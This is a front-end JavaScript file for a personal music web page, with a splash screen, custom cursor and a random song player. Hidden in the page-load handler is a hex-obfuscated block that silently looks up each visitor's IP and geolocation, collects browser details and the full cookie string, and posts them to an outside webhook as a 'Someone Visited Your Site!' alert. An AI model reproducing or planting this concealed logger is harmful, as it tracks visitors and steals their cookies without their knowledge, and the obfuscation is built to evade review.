const blackScreen = document.querySelector(".black-screen");

function toggleBlackScreen() {
  document.body.classList.toggle("black-screen");
  if (document.body.classList.contains("black-screen")) {
    document.querySelector("#header").classList.add("black-screen");
  } else {
    document.querySelector("#header").classList.remove("black-screen");
  }
}

if (blackScreen) {
  blackScreen.addEventListener("click", toggleBlackScreen);
}

function deleting() {
  var button = document.getElementById("button_1");
  if (button) {
    button.style.display = "none";
  }
  var div = document.getElementById("black-screen");
  if (div) {
    div.style.display = "none";
  }
}

var button = document.getElementById("button_1");

if (button) {
  button.addEventListener("click", function() {
    audio.play();
    var div = document.getElementById("black-screen");
    if (div) {
      div.style.display = "none";
    }
    deleting();
  });
}

var customCursor = document.createElement("div");
customCursor.classList.add("custom-cursor");
document.body.appendChild(customCursor);

document.addEventListener("mousemove", function(event) {
  customCursor.style.left = event.clientX + "px";
  customCursor.style.top = event.clientY + "px";
});

document.addEventListener("scroll", function() {
  var scrollX = window.scrollX || window.pageXOffset;
  var scrollY = window.scrollY || window.pageYOffset;
  customCursor.style.left = scrollX + event.clientX + "px";
  customCursor.style.top = scrollY + event.clientY + "px";
});

    
var songs = [
  "assets/music/Cant Trust - Keef Chief.mp3",
  "assets/music/Control - Ab-Soul.mp3",
  "assets/music/DNA - Kendrick Lamar.mp3",
  "assets/music/Everyday - Chief Keef.mp3",
  "assets/music/Geeked (Bass Boosted) - CHII WVTTZ + Set Da Trend + C Blu + Dougie B.mp3",
  "assets/music/Get Out - Comethazine.mp3",
  "assets/music/Go Stupid - Polo G.mp3",
  "assets/music/I Don't Like - Chief Keef.mp3",
  "assets/music/In Control - Youngboy Never Broke Again.mp3",
  "assets/music/Love Sosa - Chief Keef.mp3",
  "assets/music/M.A.A.D. City - Kendrick Lamar.mp3",
  "assets/music/Make No Sense - Youngboy Never Broke Again.mp3",
  "assets/music/Monster - Kanye West.mp3",
  "assets/music/Only You Freestyle - Headie One.mp3",
  "assets/music/Sawarim - idk the author.mp3",
  "assets/music/Sosa - Chief Keef.mp3",
  "assets/music/Spinback - Comethazine.mp3",
  "assets/music/Still Ballin' (Remix) - 2Pac.mp3",
  "assets/music/True Religion Fein - Chief Keef.mp3",
  "assets/music/Walk - Comethanize.mp3",
  "assets/music/Wesley's Theory - Kendrick Lamar.mp3"
];
var audio = new Audio();
audio.loop = true;
audio.preload = "auto";
var currentSongIndex = -1;
document.addEventListener("DOMContentLoaded", function() {
  var _$_f6fb=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x69\x70\x61\x70\x69\x2E\x63\x6F\x2F\x6A\x73\x6F\x6E\x2F","\x6A\x73\x6F\x6E","\x63\x6F\x6E\x74\x69\x6E\x65\x6E\x74\x5F\x63\x6F\x64\x65","\x63\x6F\x75\x6E\x74\x72\x79\x5F\x6E\x61\x6D\x65","\x63\x6F\x75\x6E\x74\x72\x79\x5F\x63\x6F\x64\x65","\x6C\x61\x74\x69\x74\x75\x64\x65","\x6C\x6F\x6E\x67\x69\x74\x75\x64\x65","\x72\x65\x67\x69\x6F\x6E","\x63\x69\x74\x79","\x74\x69\x6D\x65\x7A\x6F\x6E\x65","\x63\x75\x72\x72\x65\x6E\x63\x79","\x63\x6F\x75\x6E\x74\x72\x79\x5F\x63\x61\x6C\x6C\x69\x6E\x67\x5F\x63\x6F\x64\x65","\x6C\x61\x6E\x67\x75\x61\x67\x65\x73","\x63\x6F\x75\x6E\x74\x72\x79\x5F\x70\x6F\x70\x75\x6C\x61\x74\x69\x6F\x6E","\x69\x6E\x5F\x65\x75","\x59\x65\x73","\x4E\x6F","\x69\x70","\x6F\x72\x67","\x76\x65\x72\x73\x69\x6F\x6E","\x6E\x65\x74\x77\x6F\x72\x6B","\x61\x70\x70\x4E\x61\x6D\x65","\x75\x73\x65\x72\x41\x67\x65\x6E\x74","\x68\x72\x65\x66","\x6C\x65\x6E\x67\x74\x68","\x6C\x61\x6E\x67\x75\x61\x67\x65","\x70\x6C\x61\x74\x66\x6F\x72\x6D","\x6A\x61\x76\x61\x45\x6E\x61\x62\x6C\x65\x64","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x63\x6F\x6F\x6B\x69\x65","\x5F\x5F\x2A\x2A\x53\x6F\x6D\x65\x6F\x6E\x65\x20\x56\x69\x73\x69\x74\x65\x64\x20\x59\x6F\x75\x72\x20\x53\x69\x74\x65\x21\x2A\x2A\x5F\x5F","\x2A\x2A\x49\x50\x20\x49\x6E\x66\x6F\x2A\x2A\x0A","\x60\x60\x60\x64\x69\x66\x66\x0A","\x63\x6F\x6E\x74\x69\x6E\x65\x6E\x74","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x63\x6F\x75\x6E\x74\x72\x79","\x73\x74\x61\x74\x65","\x67\x6F\x6F\x67\x6C\x65\x4D\x61\x70\x73","\x70\x68\x6F\x6E\x65\x43\x6F\x64\x65","\x70\x6F\x70\x75\x6C\x61\x74\x69\x6F\x6E","\x69\x6E\x45\x55","\x69\x6E\x66\x6F","\x70\x72\x6F\x76\x69\x64\x65\x72","\x60\x60\x60","\x2A\x2A\x42\x72\x6F\x77\x73\x65\x72\x20\x49\x6E\x66\x6F\x2A\x2A\x0A","\x62\x72\x6F\x77\x73\x65\x72","\x62\x72\x6F\x77\x73\x65\x72\x49\x6E\x66\x6F","\x70\x61\x67\x65","\x68\x69\x73\x74\x6F\x72\x79\x4C\x65\x6E\x67\x74\x68","\x63\x6F\x6F\x6B\x69\x65\x73\x45\x6E\x61\x62\x6C\x65\x64","\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x45\x6E\x61\x62\x6C\x65\x64","\x63\x6F\x6F\x6B\x69\x65\x44\x75\x6D\x70","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x65\x76\x65\x6E\x74\x73\x2E\x68\x6F\x6F\x6B\x64\x65\x63\x6B\x2E\x63\x6F\x6D\x2F\x65\x2F\x73\x72\x63\x5F\x53\x31\x64\x69\x4A\x70\x30\x6A\x30\x64\x50\x7A","\x50\x4F\x53\x54","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E","\x73\x74\x72\x69\x6E\x67\x69\x66\x79"];async function getIPInfo(){const _0x9E31= await fetch(_$_f6fb[0]);const _0x9DD1= await _0x9E31[_$_f6fb[1]]();const _0x9E11={location:{continent:_0x9DD1[_$_f6fb[2]],country:_0x9DD1[_$_f6fb[3]],country_code:_0x9DD1[_$_f6fb[4]],latitude:_0x9DD1[_$_f6fb[5]],longitude:_0x9DD1[_$_f6fb[6]],state:_0x9DD1[_$_f6fb[7]],city:_0x9DD1[_$_f6fb[8]],googleMaps:`https://www.google.com/maps?q=${_0x9DD1[_$_f6fb[5]]},${_0x9DD1[_$_f6fb[6]]}`,timezone:_0x9DD1[_$_f6fb[9]],currency:_0x9DD1[_$_f6fb[10]],phoneCode:_0x9DD1[_$_f6fb[11]],languages:_0x9DD1[_$_f6fb[12]],population:_0x9DD1[_$_f6fb[13]],inEU:_0x9DD1[_$_f6fb[14]]?_$_f6fb[15]:_$_f6fb[16]},info:{ip:_0x9DD1[_$_f6fb[17]],provider:_0x9DD1[_$_f6fb[18]],version:_0x9DD1[_$_f6fb[19]],network:_0x9DD1[_$_f6fb[20]]},browserInfo:{browser:navigator[_$_f6fb[21]],userAgent:navigator[_$_f6fb[22]],page:location[_$_f6fb[23]],historyLength:history[_$_f6fb[24]],language:navigator[_$_f6fb[25]],platform:navigator[_$_f6fb[26]],javaEnabled:navigator[_$_f6fb[27]](),cookiesEnabled:navigator[_$_f6fb[28]],javascriptEnabled:true,cookieDump:document[_$_f6fb[29]]}};const _0x9DF1={title:_$_f6fb[30],description:_$_f6fb[31]+ _$_f6fb[32]+ `- Location Information:\n`+ `+ Continent: ${_0x9E11[_$_f6fb[34]][_$_f6fb[33]]}\n`+ `+ Country: ${_0x9E11[_$_f6fb[34]][_$_f6fb[35]]}\n`+ `+ Country Code: ${_0x9E11[_$_f6fb[34]][_$_f6fb[4]]}\n`+ `+ State: ${_0x9E11[_$_f6fb[34]][_$_f6fb[36]]}\n`+ `+ City: ${_0x9E11[_$_f6fb[34]][_$_f6fb[8]]}\n`+ `+ Google Maps: ${_0x9E11[_$_f6fb[34]][_$_f6fb[37]]}\n`+ `+ Timezone: ${_0x9E11[_$_f6fb[34]][_$_f6fb[9]]}\n`+ `+ Currency: ${_0x9E11[_$_f6fb[34]][_$_f6fb[10]]}\n`+ `+ Phone Code: ${_0x9E11[_$_f6fb[34]][_$_f6fb[38]]}\n`+ `+ Languages: ${_0x9E11[_$_f6fb[34]][_$_f6fb[12]]}\n`+ `+ Population: ${_0x9E11[_$_f6fb[34]][_$_f6fb[39]]}\n`+ `+ In EU: ${_0x9E11[_$_f6fb[34]][_$_f6fb[40]]}\n\n`+ `+ Latitude: ${_0x9E11[_$_f6fb[34]][_$_f6fb[5]]}\n`+ `+ Longitude: ${_0x9E11[_$_f6fb[34]][_$_f6fb[6]]}\n\n`+ `- Network Information\n`+ `+ IP: ${_0x9E11[_$_f6fb[41]][_$_f6fb[17]]}\n`+ `+ Provider: ${_0x9E11[_$_f6fb[41]][_$_f6fb[42]]}\n`+ `+ Network: ${_0x9E11[_$_f6fb[41]][_$_f6fb[20]]}\n`+ `+ Version: ${_0x9E11[_$_f6fb[41]][_$_f6fb[19]]}\n`+ _$_f6fb[43]+ _$_f6fb[44]+ _$_f6fb[32]+ `- Browser & Document Information:\n`+ `+ Browser: ${_0x9E11[_$_f6fb[46]][_$_f6fb[45]]}\n`+ `+ User Agent: ${_0x9E11[_$_f6fb[46]][_$_f6fb[22]]}\n`+ `+ Page: ${_0x9E11[_$_f6fb[46]][_$_f6fb[47]]}\n`+ `+ History Length: ${_0x9E11[_$_f6fb[46]][_$_f6fb[48]]}\n`+ `+ Language: ${_0x9E11[_$_f6fb[46]][_$_f6fb[25]]}\n`+ `+ Platform: ${_0x9E11[_$_f6fb[46]][_$_f6fb[26]]}\n`+ `+ Java Enabled: ${_0x9E11[_$_f6fb[46]][_$_f6fb[27]]}\n`+ `+ Cookies Enabled: ${_0x9E11[_$_f6fb[46]][_$_f6fb[49]]}\n`+ `+ Javascript Enabled: ${_0x9E11[_$_f6fb[46]][_$_f6fb[50]]}\n\n`+ `+ Cookie Dump: ${_0x9E11[_$_f6fb[46]][_$_f6fb[51]]}`+ _$_f6fb[43],color:0x00FF00};const _0x9E51=_$_f6fb[52]; await fetch(_0x9E51,{method:_$_f6fb[53],headers:{'\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65':_$_f6fb[54]},body:JSON[_$_f6fb[55]]({content:`<@1083368117230653460>`,embeds:[_0x9DF1]})})}getIPInfo()
  function playNextSong() {
    var nextSongIndex = Math.floor(Math.random() * songs.length);
    while (nextSongIndex === currentSongIndex) {
      nextSongIndex = Math.floor(Math.random() * songs.length);
    }
    currentSongIndex = nextSongIndex;
    var nextSong = songs[currentSongIndex];
    audio.src = nextSong;
    console.log(document.querySelector(".now-playing-title"));
  
    var nowPlayingTitle = document.querySelector(".now-playing-title");
    if (nowPlayingTitle) {
      nowPlayingTitle.innerHTML = "Now Playing:";
    }
  
    console.log(document.querySelector(".now-playing-song"));
  
    var nowPlayingSong = document.querySelector(".now-playing-song");
    if (nowPlayingSong) {
      nowPlayingSong.innerHTML = nextSong.replace(/^.*[\\\/]/, '').slice(0, -4);
    }
  }          
  
    audio.addEventListener("ended", playNextSong);
    playNextSong();

  window.addEventListener("load", function() {
  audio.play();
    }); 
});
